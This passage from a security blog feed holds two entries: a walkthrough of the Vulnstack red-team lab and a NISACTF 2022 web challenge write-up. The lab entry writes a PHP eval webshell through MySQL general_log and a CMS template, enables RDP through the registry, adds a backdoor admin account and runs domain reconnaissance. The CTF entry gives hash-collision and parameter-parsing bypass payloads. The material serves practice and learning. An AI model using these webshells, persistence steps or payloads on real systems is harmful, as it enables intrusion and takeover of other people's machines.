<span class="string">&#x27;%general%&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220409202901.png"></p><p>开启<code>general_log</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log<span class="operator">=</span><span class="keyword">on</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log_file<span class="operator">=</span><span class="string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220409205015.png"></p><p>往日志文件写shell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php eval($_POST[sh]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>蚁剑连接shell.php成功</p><p><img src="/images/BUU/20220409205354.png"></p><p>（这种情况下改动过的各种设置关不关回去其实也已经……无所谓了……动作太大 悲）</p><p>另一条getshell的路是从cms后台入手</p><p><img src="/images/BUU/20220409211332.png"></p><p>登陆后台后同样能获取一些敏感信息</p><p><img src="/images/BUU/20220409212247.png"></p><p>我们在前台模板设置中能看到所有的模板文件，存放路径可以通过对应cms的默认目录结构查找到。退一步讲，即使不知道模板的存放路径在哪，通过文件名和内容要是能猜出它们渲染的页面，也多是一件美逝啊</p><p><img src="/images/BUU/20220409213030.png"></p><p>往index_index.php文件里写入shell</p><p><img src="/images/BUU/20220409215611.png"></p><p>保存后蚁剑连接网站index.php成功。</p><p>同时后台也提供了SQL执行的接口，可故技重施</p><p>当然我们还可以通过cms本身的漏洞从后台外打进去，这里就不再展开了的说。</p><h2 id="信息收集-stage-2"><a href="#信息收集-stage-2" class="headerlink" title="信息收集 stage-2"></a>信息收集 stage-2</h2><p>我们发现拿到的是个管理员的shell</p><p><img src="/images/BUU/20220410120103.png"></p><p>常用信息收集类命令</p><blockquote><p>ipconfig /all   查看本机ip，所在域<br>route print     打印路由信息<br>net view        查看局域网内其他主机名<br>arp -a          查看arp缓存<br>net start       查看开启了哪些服务<br>net share       查看开启了哪些共享<br>net share ipc$  开启ipc共享<br>net share c$    开启c盘共享<br>net use \192.168.xx.xx\ipc$ “” /user:””   与192.168.xx.xx建立空连接<br>net use \192.168.xx.xx\c$ “密码” /user:”用户名”  建立c盘共享<br>dir \192.168.xx.xx\c$\user    查看192.168.xx.xx c盘user目录下的文件<br>​<br>net config Workstation   查看计算机名、全名、用户名、系统版本、工作站、域、登录域<br>net user                 查看本机用户列表<br>net user /domain         查看域用户<br>net localgroup administrators   查看本地管理员组（通常会有域用户）<br>net view /domain         查看有几个域<br>net user 用户名 /domain   获取指定域用户的信息<br>net group /domain        查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）<br>net group 组名 /domain    查看域中某工作组<br>net group “domain admins” /domain  查看域管理员的名字<br>net group “domain computers” /domain  查看域中的其他主机名<br>net group “domain controllers” /domain  查看域控制器（可能有多台）</p></blockquote><p><img src="/images/BUU/20220410170344.png"></p><p><img src="/images/BUU/20220410170926.png"></p><p>查看路由</p><p><img src="/images/BUU/20220410171345.png"></p><p>粗略整理一下得到的信息，该主机所在域为<strong>god.org</strong>，域控为<strong>OWA$<strong>，域管理员为</strong>Administrator</strong>，内网网段为<strong>192.168.52.0/24</strong>。</p><p>ping一下域控</p><p><img src="/images/BUU/20220410172156.png"></p><p>得知域控地址为<strong>192.168.52.138</strong>。</p><h2 id="支线任务"><a href="#支线任务" class="headerlink" title="支线任务"></a>支线任务</h2><p>针对windows系统的渗透，很多时候使用图形界面更为方便</p><p>尝试开启3389远程桌面连接端口</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f</span><br><span class="line"></span><br><span class="line">netstat -ano | <span class="built_in">find</span> &quot;<span class="number">3389</span>&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220410173546.png"></p><p>再新建一个用户并拉进管理员组</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> user h4ck @BtpgYsfhPv0tP /add</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> localgroup administrators h4ck /add</span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220410211848.png"></p><p><del>（忘记截屏了）</del></p><p>不要问为什么密码这么难记，问就是密码不满足密码策略要求怎么办 试了十多次才创建成功的说（悲</p><p>等我拿下你之后指定没你好果汁吃熬（指第一个就把复杂密码策略扬了</p><p>远程桌面连接，这里为了方便操作选择用linux平台的rdesktop</p><p>以新管理员h4ck身份登录主机，30秒后，我们获得目标主机桌面，管理员的桌面session将被断开。但管理员的后台程序并不受影响，网站仍会正常服务。惊不惊动管理员大概率取决于安全防护程序的报警，或者对面的电脑桌前有没有人叭。</p><p><img src="/images/BUU/20220410211503.png"></p><p>这一段操作如此流畅的原因是防火墙是提前全关的，留下的痕迹也是数不胜数，后面会补上囸穿防火墙的各种姿势和后渗透痕迹清理的说。</p><h2 id="信息收集-stage-3"><a href="#信息收集-stage-3" class="headerlink" title="信息收集 stage-3"></a>信息收集 stage-3</h2>]]></content>
    
    
    <summary type="html">&lt;p&gt;OK兄弟们，全体目光向我看齐！看我看我，我宣布个事儿！&lt;/p&gt;
&lt;p&gt;从今天开始，二号厨房正式投入使用啦！（指正式上手内网渗透&lt;/p&gt;
&lt;p&gt;第一个靶场选择了&lt;a href=&quot;http://vulnstack.qiyuanxuetang.net/vuln/detail/2/&quot;&gt;红日ATT&amp;amp;CK实战系列 红队（一）&lt;/a&gt; 据说比较基础（危）所以搭好环境来学习了&lt;/p&gt;
&lt;p&gt;想了想选择先把windows防火墙关了，前期学习进攻思路，之后再学习针对性的过墙叭。&lt;/p&gt;</summary>
    
    
    
    
    <category term="Computer Networks" scheme="https://www.m0x01sery.com/tags/Computer-Networks/"/>
    
    <category term="Intranet penetration" scheme="https://www.m0x01sery.com/tags/Intranet-penetration/"/>
    
  </entry>
  
  <entry>
    <title>NISACTF2022 web方向全复现</title>
    <link href="https://www.m0x01sery.com/2022/04/01/[NISA2022]all-web/"/>
    <id>https://www.m0x01sery.com/2022/04/01/[NISA2022]all-web/</id>
    <published>2022-03-31T16:00:00.000Z</published>
    <updated>2022-04-05T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="comment">// ‮⁦NISACTF⁩⁦Welcome to</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">&quot;jitanglailo&quot;</span> == <span class="variable">$_GET</span>[ahahahaha] &amp;‮⁦+!!⁩⁦&amp; <span class="string">&quot;‮⁦ Flag!⁩⁦N1SACTF&quot;</span> == <span class="variable">$_GET</span>[‮⁦Ugeiwo⁩⁦cuishiyuan]) &#123; <span class="comment">//tnnd! weishenme b</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><span id="more"></span><p>存在控制字符混淆视觉（后来查到是unicode双向控制字符），那就全部拖下来用十六进制查看器打开康康</p><p><img src="/images/BUU/20220401213718.png"></p><p>将完整参数的十六进制编码复制下来，加上百分号变成url编码形式上传</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>//<span class="number">1.14</span>.<span class="number">71.254</span>:<span class="number">28667</span>?ahahahaha<span class="operator">=</span>jitanglailo&amp;<span class="variable">%E2</span><span class="variable">%80</span><span class="variable">%AE</span><span class="variable">%E2</span><span class="variable">%81</span><span class="variable">%A6</span><span class="variable">%55</span><span class="variable">%67</span><span class="variable">%65</span><span class="variable">%69</span><span class="variable">%77</span><span class="variable">%6</span>F<span class="variable">%E2</span><span class="variable">%81</span><span class="variable">%A9</span><span class="variable">%E2</span><span class="variable">%81</span><span class="variable">%A6</span><span class="variable">%63</span><span class="variable">%75</span><span class="variable">%69</span><span class="variable">%73</span><span class="variable">%68</span><span class="variable">%69</span><span class="variable">%79</span><span class="variable">%75</span><span class="variable">%61</span><span class="variable">%6</span>E<span class="operator">=</span><span class="variable">%E2</span><span class="variable">%80</span><span class="variable">%AE</span><span class="variable">%E2</span><span class="variable">%81</span><span class="variable">%A6</span><span class="variable">%20</span><span class="variable">%46</span><span class="variable">%6</span>C<span class="variable">%61</span><span class="variable">%67</span><span class="variable">%21</span><span class="variable">%E2</span><span class="variable">%81</span><span class="variable">%A9</span><span class="variable">%E2</span><span class="variable">%81</span><span class="variable">%A6</span><span class="variable">%4</span>E<span class="variable">%31</span><span class="variable">%53</span><span class="variable">%41</span><span class="variable">%43</span><span class="variable">%54</span><span class="variable">%46</span></span><br></pre></td></tr></table></figure><p><img src="/images/BUU/20220401214325.png"></p><h1 id="level-up"><a href="#level-up" class="headerlink" title="level-up"></a>level-up</h1><p><img src="/images/BUU/20220401215014.png"></p><p>提示<code>robots.txt</code>，访问找到第二关</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//here is level 2</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a1</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>];</span><br><span class="line">    <span class="variable">$a2</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a1</span> == <span class="variable">$a2</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;????&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$a1</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$a2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;level 2 failed ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>md5强碰撞，传入数组会被强制转换为string类型，只有靠强大的互联网搜索payload了</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array<span class="number">1</span><span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%00</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%55</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span>&amp;array<span class="number">2</span><span class="operator">=</span><span class="variable">%4</span>d<span class="variable">%c9</span><span class="variable">%68</span><span class="variable">%ff</span><span class="variable">%0</span>e<span class="variable">%e3</span><span class="variable">%5</span><span class="keyword">c</span><span class="variable">%20</span><span class="variable">%95</span><span class="variable">%72</span><span class="variable">%d4</span><span class="variable">%77</span><span class="variable">%7</span>b<span class="variable">%72</span><span class="variable">%15</span><span class="variable">%87</span><span class="variable">%d3</span><span class="variable">%6</span>f<span class="variable">%a7</span><span class="variable">%b2</span><span class="variable">%1</span>b<span class="variable">%dc</span><span class="variable">%56</span><span class="variable">%b7</span><span class="variable">%4</span>a<span class="variable">%3</span>d<span class="variable">%c0</span><span class="variable">%78</span><span class="variable">%3</span>e<span class="variable">%7</span>b<span class="variable">%95</span><span class="variable">%18</span><span class="variable">%af</span><span class="variable">%bf</span><span class="variable">%a2</span><span class="variable">%02</span><span class="variable">%a8</span><span class="variable">%28</span><span class="variable">%4</span>b<span class="variable">%f3</span><span class="variable">%6</span>e<span class="variable">%8</span>e<span class="variable">%4</span>b<span class="variable">%55</span><span class="variable">%b3</span><span class="variable">%5</span>f<span class="variable">%42</span><span class="variable">%75</span><span class="variable">%93</span><span class="variable">%d8</span><span class="variable">%49</span><span class="variable">%67</span><span class="variable">%6</span>d<span class="variable">%a0</span><span class="variable">%d1</span><span class="variable">%d5</span><span class="variable">%5</span>d<span class="variable">%83</span><span class="variable">%60</span><span class="variable">%fb</span><span class="variable">%5</span>f<span class="variable">%07</span><span class="variable">%fe</span><span class="variable">%a2</span></span><br></pre></td></tr></table></figure><p>进入第三关</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//here is level 3</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a1</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array1&#x27;</span>];</span><br><span class="line">    <span class="variable">$a2</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;array2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$a1</span> == <span class="variable">$a2</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;????&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">sha1</span>(<span class="variable">$a1</span>) === <span class="title function_ invoke__">sha1</span>(<span class="variable">$a2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$level4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;level 3 failed ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>sha1强碰撞 强大的互联网再一次向我们提供了宝贵的payload</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array<span class="number">1</span><span class="operator">=</span><span class="variable">%25</span>PDF<span class="number">-1.3</span><span class="variable">%0</span>A<span class="variable">%25</span><span class="variable">%E2</span><span class="variable">%E3</span><span class="variable">%CF</span><span class="variable">%D3</span><span class="variable">%0</span>A<span class="variable">%0</span>A<span class="variable">%0</span>A<span class="number">1</span><span class="variable">%200</span><span class="variable">%20</span>obj<span class="variable">%0</span>A<span class="variable">%3</span>C<span class="variable">%3</span>C/Width<span class="variable">%202</span><span class="variable">%200</span><span class="variable">%20</span>R/Height<span class="variable">%203</span><span class="variable">%200</span><span class="variable">%20</span>R/Type<span class="variable">%204</span><span class="variable">%200</span><span class="variable">%20</span>R/Subtype<span class="variable">%205</span><span class="variable">%200</span><span class="variable">%20</span>R/Filter<span class="variable">%206</span><span class="variable">%200</span><span class="variable">%20</span>R/ColorSpace<span class="variable">%207</span><span class="variable">%200</span><span class="variable">%20</span>R/Length<span class="variable">%208</span><span class="variable">%200</span><span class="variable">%20</span>R/BitsPerComponent<span class="variable">%208</span><span class="variable">%3</span>E<span class="variable">%3</span>E<span class="variable">%0</span>Astream<span class="variable">%0</span>A<span class="variable">%FF</span><span class="variable">%D8</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%00</span><span class="variable">%24</span>SHA<span class="number">-1</span><span class="variable">%20</span>is<span class="variable">%20</span>dead<span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%85</span>/<span class="variable">%EC</span><span class="variable">%09</span><span class="variable">%239</span>u<span class="variable">%9</span>C<span class="number">9</span><span class="variable">%B1</span><span class="variable">%A1</span><span class="variable">%C6</span><span class="variable">%3</span>CL<span class="variable">%97</span><span class="variable">%E1</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%01</span>sF<span class="variable">%DC</span><span class="variable">%91</span>f<span class="variable">%B6</span><span class="variable">%7</span>E<span class="variable">%11</span><span class="variable">%8</span>F<span class="variable">%02</span><span class="variable">%9</span>A<span class="variable">%B6</span><span class="variable">%21</span><span class="variable">%B2V</span><span class="variable">%0</span>F<span class="variable">%F9</span><span class="variable">%CAg</span><span class="variable">%CC</span><span class="variable">%A8</span><span class="variable">%C7</span><span class="variable">%F8</span><span class="variable">%5</span>B<span class="variable">%A8Ly</span><span class="variable">%03</span><span class="variable">%0</span>C<span class="variable">%2</span>B<span class="variable">%3</span>D<span class="variable">%E2</span><span class="variable">%18</span><span class="variable">%F8m</span><span class="variable">%B3</span><span class="variable">%A9</span><span class="variable">%09</span><span class="variable">%01</span><span class="variable">%D5</span><span class="variable">%DFE</span><span class="variable">%C1O</span><span class="variable">%26</span><span class="variable">%FE</span><span class="variable">%DF</span><span class="variable">%B3</span><span class="variable">%DC8</span><span class="variable">%E9j</span><span class="variable">%C2</span>/<span class="variable">%E7</span><span class="variable">%BDr</span><span class="variable">%8</span>F<span class="variable">%0</span>EE<span class="variable">%BC</span><span class="variable">%E0F</span><span class="variable">%D2</span><span class="variable">%3</span>CW<span class="variable">%0</span>F<span class="variable">%EB</span><span class="variable">%14</span><span class="variable">%13</span><span class="variable">%98</span><span class="variable">%BBU.</span><span class="variable">%F5</span><span class="variable">%A0</span><span class="variable">%A8</span><span class="variable">%2</span>B<span class="variable">%E31</span><span class="variable">%FE</span><span class="variable">%A4</span><span class="variable">%807</span><span class="variable">%B8</span><span class="variable">%B5</span><span class="variable">%D7</span><span class="variable">%1</span>F<span class="variable">%0</span>E<span class="number">3</span>.<span class="variable">%DF</span><span class="variable">%93</span><span class="variable">%AC5</span><span class="variable">%00</span><span class="variable">%EBM</span><span class="variable">%DC</span><span class="variable">%0</span>D<span class="variable">%EC</span><span class="variable">%C1</span><span class="variable">%A8dy</span><span class="variable">%0</span>Cx<span class="variable">%2</span>Cv<span class="variable">%21</span>V<span class="variable">%60</span><span class="variable">%DD0</span><span class="variable">%97</span><span class="variable">%91</span><span class="variable">%D0k</span><span class="variable">%D0</span><span class="variable">%AF</span><span class="variable">%3</span>F<span class="variable">%98</span><span class="variable">%CD</span><span class="variable">%A4</span><span class="variable">%BCF</span><span class="variable">%29</span><span class="variable">%B1</span>&amp;array<span class="number">2</span><span class="operator">=</span><span class="variable">%25</span>PDF<span class="number">-1.3</span><span class="variable">%0</span>A<span class="variable">%25</span><span class="variable">%E2</span><span class="variable">%E3</span><span class="variable">%CF</span><span class="variable">%D3</span><span class="variable">%0</span>A<span class="variable">%0</span>A<span class="variable">%0</span>A<span class="number">1</span><span class="variable">%200</span><span class="variable">%20</span>obj<span class="variable">%0</span>A<span class="variable">%3</span>C<span class="variable">%3</span>C/Width<span class="variable">%202</span><span class="variable">%200</span><span class="variable">%20</span>R/Height<span class="variable">%203</span><span class="variable">%200</span><span class="variable">%20</span>R/Type<span class="variable">%204</span><span class="variable">%200</span><span class="variable">%20</span>R/Subtype<span class="variable">%205</span><span class="variable">%200</span><span class="variable">%20</span>R/Filter<span class="variable">%206</span><span class="variable">%200</span><span class="variable">%20</span>R/ColorSpace<span class="variable">%207</span><span class="variable">%200</span><span class="variable">%20</span>R/Length<span class="variable">%208</span><span class="variable">%200</span><span class="variable">%20</span>R/BitsPerComponent<span class="variable">%208</span><span class="variable">%3</span>E<span class="variable">%3</span>E<span class="variable">%0</span>Astream<span class="variable">%0</span>A<span class="variable">%FF</span><span class="variable">%D8</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%00</span><span class="variable">%24</span>SHA<span class="number">-1</span><span class="variable">%20</span>is<span class="variable">%20</span>dead<span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%21</span><span class="variable">%85</span>/<span class="variable">%EC</span><span class="variable">%09</span><span class="variable">%239</span>u<span class="variable">%9</span>C<span class="number">9</span><span class="variable">%B1</span><span class="variable">%A1</span><span class="variable">%C6</span><span class="variable">%3</span>CL<span class="variable">%97</span><span class="variable">%E1</span><span class="variable">%FF</span><span class="variable">%FE</span><span class="variable">%01</span><span class="variable">%7</span>FF<span class="variable">%DC</span><span class="variable">%93</span><span class="variable">%A6</span><span class="variable">%B6</span><span class="variable">%7</span>E<span class="variable">%01</span><span class="variable">%3</span>B<span class="variable">%02</span><span class="variable">%9</span>A<span class="variable">%AA</span><span class="variable">%1</span>D<span class="variable">%B2V</span><span class="variable">%0</span>BE<span class="variable">%CAg</span><span class="variable">%D6</span><span class="variable">%88</span><span class="variable">%C7</span><span class="variable">%F8K</span><span class="variable">%8</span>CLy<span class="variable">%1</span>F<span class="variable">%E0</span><span class="variable">%2</span>B<span class="variable">%3</span>D<span class="variable">%F6</span><span class="variable">%14</span><span class="variable">%F8m</span><span class="variable">%B1i</span><span class="variable">%09</span><span class="variable">%01</span><span class="variable">%C5kE</span><span class="variable">%C1S</span><span class="variable">%0</span>A<span class="variable">%FE</span><span class="variable">%DF</span><span class="variable">%B7</span><span class="variable">%608</span><span class="variable">%E9rr</span>/<span class="variable">%E7</span><span class="variable">%ADr</span><span class="variable">%8</span>F<span class="variable">%0</span>EI<span class="variable">%04</span><span class="variable">%E0F</span><span class="variable">%C20W</span><span class="variable">%0</span>F<span class="variable">%E9</span><span class="variable">%D4</span><span class="variable">%13</span><span class="variable">%98</span><span class="variable">%AB</span><span class="variable">%E1.</span><span class="variable">%F5</span><span class="variable">%BC</span><span class="variable">%94</span><span class="variable">%2</span>B<span class="variable">%E35B</span><span class="variable">%A4</span><span class="variable">%80</span>-<span class="variable">%98</span><span class="variable">%B5</span><span class="variable">%D7</span><span class="variable">%0</span>F<span class="variable">%2</span>A<span class="number">3</span>.<span class="variable">%C3</span><span class="variable">%7</span>F<span class="variable">%AC5</span><span class="variable">%14</span><span class="variable">%E7M</span><span class="variable">%DC</span><span class="variable">%0</span>F<span class="variable">%2</span>C<span class="variable">%C1</span><span class="variable">%A8t</span><span class="variable">%CD</span><span class="variable">%0</span>Cx<span class="number">0</span>Z<span class="variable">%21</span>Vda<span class="number">0</span><span class="variable">%97</span><span class="variable">%89</span><span class="variable">%60</span>k<span class="variable">%D0</span><span class="variable">%BF</span><span class="variable">%3</span>F<span class="variable">%98</span><span class="variable">%CD</span><span class="variable">%A8</span><span class="variable">%04</span>F<span class="variable">%29</span><span class="variable">%A1</span></span><br></pre></td></tr></table></figure><p><a href="https://shattered.it/">broken SHA-1</a></p><p>进入下一关</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//here is last level</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;str.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>] == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;give me a parameter&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |_|20|5f|2e|\./&#x27;</span>,<span class="variable">$str</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;blacklist here&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;NI_SA_&#x27;</span>] === <span class="string">&quot;txw4ever&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$level5</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;level 4 failed ...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处有两种解法</p><p>第一种是利用<a href="https://www.freebuf.com/column/207936.html">php字符串解析特性</a></p><blockquote><p>PHP在接受参数名时，需要将怪异的字符串转换为一个有效的变量名，因此当进行解析时，它会做两件事：</p><p>删除空白符</p><p>将某些字符转换为下划线（包括空格）</p></blockquote><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">?N</span>I+<span class="variable constant_">SA</span>+=txw4ever</span><br></pre></td></tr></table></figure><p>参数名绕过blacklist后准备存进<code>$_GET[]</code>数组前，<code>+</code>号自动被转换成下划线，就变成了<code>NI_SA_</code>。</p><p>另一个则是<code>parse_url()</code>解析漏洞，典中典了，记录一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 